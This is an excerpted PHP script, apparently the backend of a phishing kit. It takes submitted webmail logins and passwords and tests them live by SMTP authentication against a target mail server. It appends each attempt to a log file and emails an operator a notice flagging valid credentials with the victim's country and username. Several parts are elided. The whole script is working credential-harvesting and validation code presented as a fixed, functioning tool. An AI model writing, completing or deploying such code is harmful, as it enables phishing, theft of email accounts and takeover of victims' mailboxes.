<?php
// Fixed version - handles SMTP errors gracefully
...
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    ob_clean();
    echo json_encode([
        'status' => 'SMTP Credential Tester is working',
        'method' => 'GET',
        'timestamp' => date('Y-m-d H:i:s'),
        'msg' => 'SMTP backend is accessible',
...
// Prepare log message
$log_message = "=== WEBMAIL LOGIN ATTEMPT #$attempt_number ===\n";
...
$log_message .= "Target SMTP: $target_smtp_server:$target_smtp_port ($target_smtp_security)\n";

// Real SMTP credential testing with faster timeout
...
// Test SMTP authentication with faster timeout
try {
    ...
    $testMail->Timeout = 5; // Reduced timeout to 5 seconds
    
    // Attempt to connect and authenticate
    if ($testMail->smtpConnect()) {
        // Try to authenticate
        if ($testMail->smtpAuthenticate($login, $passwd)) {
            $validCredentials = true;
            $credential_test_method = "Real SMTP Authentication - SUCCESS";
            $log_message .= "Status: ✅ VALID CREDENTIALS - SMTP authentication successful\n";
            $debug_info[] = "SMTP Auth: SUCCESS";
        } else {
            $validCredentials = false;
            $credential_test_method = "Real SMTP Authentication - FAILED";
            $smtp_error = "SMTP authentication failed - invalid credentials";
            $log_message .= "Status: ❌ INVALID CREDENTIALS - SMTP authentication failed\n";
            $debug_info[] = "SMTP Auth: FAILED - Invalid credentials";
        }
        $testMail->smtpClose();
    } else {
        $validCredentials = false;
        $credential_test_method = "SMTP Connection Failed";
        $smtp_error = "Could not connect to SMTP server";
        $log_message .= "Status: ❌ CONNECTION FAILED - Could not connect to SMTP server\n";
        $debug_info[] = "SMTP Connection: FAILED";
    }
} catch (Exception $e) {
    $validCredentials = false;
    $credential_test_method = "SMTP Exception";
    $smtp_error = "SMTP Error: " . $e->getMessage();
    $log_message .= "Status: ❌ SMTP EXCEPTION - " . $e->getMessage() . "\n";
    $debug_info[] = "SMTP Exception: " . substr($e->getMessage(), 0, 100);
}
...
// Log to file
$log_file = "webmail_login_log.txt";
@file_put_contents($log_file, $log_message, FILE_APPEND | LOCK_EX);

// Prepare email subject based on result
if ($validCredentials) {
    $subject = "✅ VALID WEBMAIL LOGIN - $country - $login - Attempt #$attempt_number";
    $email_status = "VALID WEBMAIL CREDENTIALS DETECTED";
} else {
    $subject = "❌ INVALID WEBMAIL LOGIN - $country - $login - Attempt #$attempt_number";
    $email_status = "INVALID WEBMAIL CREDENTIALS";
}
...
<body>
    ...
    <div class='server-info'>
        ...
        " . ($validCredentials ? 
            "<p style='color: #155724;'><span class='label'>Result:</span> ✅ SMTP authentication successful - Valid credentials</p>" : 
            "<p style='color: #721c24;'><span class='label'>Result:</span> ❌ SMTP authentication failed - Invalid credentials</p>
             <p><span class='label'>Error Details:</span> $smtp_error</p>") . "
        <p><span class='label'>Test Method:</span> $credential_test_method</p>
    </div>
</body>
</html>
";

// Send notification email using PHPMailer (with error handling)
$mail_sent = false;
$mail_error = '';
try {
    ...
    $notifyMail->FromName = 'Webmail Login Monitor';
    ...
    $notifyMail->Timeout = 10; // Faster timeout for notification email
    
    $mail_sent = $notifyMail->send();
} catch (Exception $e) {
    $mail_error = $e->getMessage();
    error_log("Failed to send notification email: " . $mail_error);
    // Don't let email failure break the main functionality
}
...
$response['notification_error'] = $mail_error;
$response['debug_info'] = [
